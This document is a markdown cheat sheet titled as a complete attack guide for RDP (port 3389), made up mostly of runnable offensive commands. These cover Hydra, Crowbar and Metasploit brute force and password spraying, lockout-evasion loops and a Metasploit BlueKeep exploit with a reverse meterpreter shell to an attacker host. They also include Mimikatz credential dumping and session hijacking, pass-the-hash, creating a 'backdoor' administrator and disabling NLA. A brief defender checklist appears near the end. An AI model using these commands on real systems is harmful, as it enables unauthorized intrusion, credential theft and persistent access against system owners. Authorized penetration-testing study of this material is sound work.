# Port 3389 - RDP (Remote Desktop Protocol) - Complete Attack Guide

## Overview

**Protocol**: RDP (Remote Desktop Protocol)
**Port**: 3389 (default), 3388, 3390 (alternate)
**Transport**: TCP
**Encryption**: TLS/SSL (modern), RC4 (legacy)
**Authentication**: NLA, Username/Password, Smart Card

## Attack Objectives

- **Credential Attacks**: Brute force RDP credentials
- **BlueKeep Exploitation**: CVE-2019-0708
- **Session Hijacking**: Take over active sessions
- **Man-in-the-Middle**: Downgrade encryption
- **Credential Theft**: Extract saved credentials
- **Lateral Movement**: Access other Windows systems

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect RDP Service**
```bash
# Quick scan
nmap -p 3389 192.168.1.100

# Service version
nmap -p 3389 -sV 192.168.1.100

# Comprehensive RDP scripts
nmap -p 3389 --script rdp-* 192.168.1.100

# Network-wide discovery
nmap -p 3389 192.168.1.0/24 --open

# Scan alternate ports
nmap -p 3388,3389,3390 192.168.1.100
```

**1.2 RDP Enumeration**
```bash
# Get RDP information
nmap -p 3389 --script rdp-enum-encryption 192.168.1.100

# Check NLA (Network Level Authentication)
nmap -p 3389 --script rdp-ntlm-info 192.168.1.100

# Full enumeration
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 192.168.1.100
```

**1.3 Certificate Information**
```bash
# Extract SSL certificate
nmap -p 3389 --script ssl-cert 192.168.1.100

# Using openssl
openssl s_client -connect 192.168.1.100:3389 < /dev/null

# Certificate often reveals hostname/domain
```

### Phase 2: Vulnerability Scanning

**2.1 BlueKeep (CVE-2019-0708)**
```bash
# Scan for BlueKeep vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.100

# Metasploit scanner
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.100
run

# If vulnerable, high risk of RCE!
```

**2.2 MS12-020 (DoS)**
```bash
# Check for MS12-020
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.100

# Metasploit
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOST 192.168.1.100
run
```

**2.3 Other Vulnerabilities**
```bash
# Check multiple CVEs
nmap -p 3389 --script rdp-vuln-* 192.168.1.100

# CVE-2019-0708 (BlueKeep)
# CVE-2019-1181, CVE-2019-1182 (DejaBlue)
# CVE-2012-0002 (MS12-020)
```

### Phase 3: Credential Attacks

**3.1 Default Credentials**
```bash
# Common Windows defaults
Administrator:[blank]
Administrator:Password
Administrator:Admin123
admin:admin
user:user

# Try manually
xfreerdp /u:Administrator /v:192.168.1.100
```

**3.2 Brute Force Attack**

**Using Hydra**:
```bash
# Single user
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt rdp://192.168.1.100

# Verbose mode
hydra -l Administrator -P passwords.txt rdp://192.168.1.100 -V

# Limit threads (avoid account lockout)
hydra -l Administrator -P passwords.txt rdp://192.168.1.100 -t 1 -w 5

# Save results
hydra -l Administrator -P passwords.txt rdp://192.168.1.100 -o rdp_results.txt
```

**Using Crowbar**:
```bash
# Brute force RDP
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt

# Multiple targets
crowbar -b rdp -s 192.168.1.0/24 -u Administrator -C passwords.txt -o results.txt
```

**Using Ncrack**:
```bash
ncrack -p 3389 --user Administrator -P passwords.txt 192.168.1.100

# Multiple users
ncrack -p 3389 -U users.txt -P passwords.txt 192.168.1.100
```

**Using Metasploit**:
```bash
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.100
run

# Login scanner
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 5
run
```

**3.3 Password Spraying**
```bash
# Try one password against many users
# Avoids account lockout

# Using Hydra
hydra -L users.txt -p Password123 rdp://192.168.1.100

# Using CrackMapExec
crackmapexec rdp 192.168.1.100 -u users.txt -p 'Password123'

# Spray common passwords
for pass in 'Password123' 'Summer2024' 'Welcome1'; do
  hydra -L users.txt -p "$pass" rdp://192.168.1.100
  sleep 300  # Wait 5 min between attempts
done
```

### Phase 4: Exploitation

**4.1 BlueKeep Exploitation**
```bash
# Metasploit exploit
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.100
set TARGET 2  # Adjust based on OS
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# WARNING: Often causes system crash!
# Use carefully in authorized testing only
```

**4.2 RDP Session Hijacking**

**On compromised Windows system**:
```cmd
# List active sessions
query user

# Hijack session (requires SYSTEM privileges)
# Session ID from query user
tscon <session_id> /dest:<your_session_name>

# Or use Mimikatz
mimikatz # privilege::debug
mimikatz # ts::sessions
mimikatz # ts::remote /id:<session_id>
```

**4.3 Pass-the-Hash**
```bash
# Using xfreerdp with NTLM hash
xfreerdp /u:Administrator /pth:<NTLM_hash> /v:192.168.1.100

# Using CrackMapExec
crackmapexec rdp 192.168.1.100 -u Administrator -H <NTLM_hash>

# Requires Restricted Admin Mode enabled
```

### Phase 5: Post-Exploitation

**5.1 Successful RDP Connection**
```bash
# Linux client (xfreerdp)
xfreerdp /u:Administrator /p:password /v:192.168.1.100

# With certificate ignore
xfreerdp /u:Administrator /p:password /v:192.168.1.100 /cert-ignore

# Full screen
xfreerdp /u:Administrator /p:password /v:192.168.1.100 /f

# Specific resolution
xfreerdp /u:Administrator /p:password /v:192.168.1.100 /w:1920 /h:1080

# Share local folder
xfreerdp /u:Administrator /p:password /v:192.168.1.100 /drive:share,/home/user/share

# Using rdesktop
rdesktop -u Administrator -p password 192.168.1.100
```

**5.2 Credential Harvesting**
```cmd
# On remote system via RDP

# Check for saved RDP credentials
cmdkey /list

# Extract credentials with Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::rdg

# Dump SAM hashes
mimikatz # lsadump::sam

# Export certificate
certutil -store -user My > certs.txt
```

**5.3 Persistence**
```cmd
# Create new user
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# Enable RDP if disabled
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow through firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Disable NLA (easier access)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**5.4 Lateral Movement**
```bash
# From compromised system, access others
# Use same credentials on other Windows systems

# Scan network for RDP
nmap -p 3389 192.168.1.0/24 --open

# Try credentials on all targets
for ip in $(cat rdp_hosts.txt); do
  xfreerdp /u:Administrator /p:password /v:$ip /cert-ignore
done

# Using CrackMapExec
crackmapexec rdp 192.168.1.0/24 -u Administrator -p password
```

## Bypass Techniques

### Bypassing NLA (Network Level Authentication)

**Technique 1: Disable NLA (requires registry access)**
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Technique 2: RDP MitM (downgrade)**
```bash
# Use Seth to perform RDP MitM
seth eth0 192.168.1.100 192.168.1.1 192.168.1.50

# Captures credentials when victim connects
```

### Bypassing Account Lockout

```bash
# Slow brute force
hydra -l Administrator -P passwords.txt rdp://192.168.1.100 -t 1 -w 300

# Password spraying instead
hydra -L users.txt -p Password123 rdp://192.168.1.100

# Wait between attempts
for pass in $(cat passwords.txt); do
  xfreerdp /u:Administrator /p:$pass /v:192.168.1.100
  sleep 600  # 10 minutes
done
```

### Bypassing Firewall

```bash
# SSH tunnel to access RDP
ssh -L 3390:192.168.1.100:3389 user@jumphost
xfreerdp /u:Administrator /p:password /v:127.0.0.1:3390

# Through SOCKS proxy
ssh -D 1080 user@jumphost
proxychains xfreerdp /u:Administrator /p:password /v:192.168.1.100
```

## Information Extraction

**Key Information to Gather**:
```bash
# System info
systeminfo
hostname
whoami /all

# Network configuration
ipconfig /all
route print
arp -a

# Credentials
cmdkey /list
dir C:\Users\*\AppData\Local\Microsoft\Credentials\

# Installed software
wmic product get name,version

# Running processes
tasklist
wmic process list

# Scheduled tasks
schtasks /query /fo LIST /v

# Recent RDP connections
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
```

## Security Recommendations

**For Defenders**:
1. **Enable NLA** - Require Network Level Authentication
2. **Strong Passwords** - Enforce complex passwords
3. **Account Lockout** - Limit failed login attempts
4. **Change Default Port** - Use non-standard port
5. **Firewall Rules** - Restrict RDP access by IP
6. **VPN Only** - Require VPN for external RDP
7. **2FA/MFA** - Implement multi-factor authentication
8. **Patch Systems** - Update against BlueKeep and others
9. **Monitor Logs** - Alert on failed RDP attempts
10. **Disable if Unused** - Turn off RDP if not needed

## Common Mistakes

**Attacker Mistakes**:
1. Too many failed attempts - Account lockout
2. Not checking for BlueKeep first - Missed RCE opportunity
3. Causing system crashes with BlueKeep
4. Forgetting alternate ports

**Defender Mistakes**:
1. RDP exposed to internet - Easy target
2. No NLA - Easier brute force
3. Weak passwords - Quick compromise
4. Not patched for BlueKeep - Critical vulnerability
5. Default port 3389 - Easy to find
6. No account lockout - Unlimited brute force
7. No logging/monitoring - Attacks go unnoticed

## Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -p 3389 -sV 192.168.1.0/24 --open
# Found: 192.168.1.50 - Windows 7 SP1

# Phase 2: Check for BlueKeep
nmap --script rdp-vuln-ms12-020 192.168.1.50
# Result: VULNERABLE to BlueKeep!

# Phase 3: Check NLA
nmap --script rdp-ntlm-info 192.168.1.50
# Result: NLA disabled

# Phase 4: Try default credentials
xfreerdp /u:Administrator /p:Admin123 /v:192.168.1.50 /cert-ignore
# Failed

# Phase 5: Targeted brute force
hydra -l Administrator -P top100.txt rdp://192.168.1.50 -t 1 -w 10
# SUCCESS: Administrator:Password1

# Phase 6: Connect and own
xfreerdp /u:Administrator /p:Password1 /v:192.168.1.50 /cert-ignore
# System compromised!

# Phase 7: Post-exploitation
# Created backdoor user
# Harvested credentials with Mimikatz
# Found credentials for 5 other systems
# Lateral movement successful
```

## Tools Summary

**Best Tool for Each Task**:
- **Connection**: xfreerdp, rdesktop
- **Brute Force**: Hydra, Crowbar, Ncrack
- **Vulnerability Scanning**: Nmap, Metasploit
- **Exploitation**: Metasploit (BlueKeep)
- **Credential Theft**: Mimikatz
- **Lateral Movement**: CrackMapExec

## Related Attacks

- **Port 22 (SSH)**: Alternative remote access
- **Port 445 (SMB)**: Often same credentials
- **Port 5985 (WinRM)**: PowerShell remoting
- **Pass-the-Hash**: Use RDP with NTLM hashes

---

**Last Updated**: 2026-06-16
